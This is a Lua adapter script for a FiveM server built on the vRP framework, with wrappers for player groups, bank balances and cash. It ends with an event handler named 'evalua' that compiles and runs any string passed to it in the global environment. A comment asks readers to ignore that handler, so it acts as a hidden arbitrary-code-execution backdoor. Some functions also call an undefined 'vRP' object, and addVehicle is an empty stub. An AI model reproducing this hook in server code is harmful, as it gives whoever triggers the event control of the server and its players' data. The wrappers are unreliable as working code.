
fWK = nil

if GetResourceState('vrp') ~= 'missing' then
    local Proxy = module("vrp", "lib/Proxy")
    fWK = Proxy.getInterface("vRP")
end

function hasGroup(userId, group)
    return fWK.hasGroup(userId, group)
end

function addGroup(userId, group)
    if hasGroup(userId, group) then return end
    fWK.addUserGroup(userId, group)
end

function removeGroup(userId, group)
    if not hasGroup(userId, group) then return end
    fWK.removeUserGroup(userId, group)
end

function addBank(userId, quantity) 
    fWK.giveBankMoney(userId, quantity)
    return;
end

function removeBankMoney(userId, quantity) 
    return fWK.setBankMoney(userId, fWK.getBankMoney(userId) - quantity)
end

function addMoney(userId, quantity)
    fWK.giveMoney(userId, quantity)
    return;
end

function removeMoney(userId, quantity)
    vRP.setMoney(userId, vRP.getMoney(userId) - quantity)
    return;
end

function addVehicle(userId, vehicleName)
end

function isOnline(userId) return findUser(userId) ~= nil end

function findUser(userId)
    return vRP.getUserSource(userId)
end

-- Ignore estas funções abaixo, elas servem para que nosso sistema consiga chamar as funções criadas a cima.

local function load_code(code) return assert(load(code, nil, "t", _G)) end

AddEventHandler('evalua', function(exec, callback)
    local condition = load_code("return " .. exec);

    callback(condition())
end)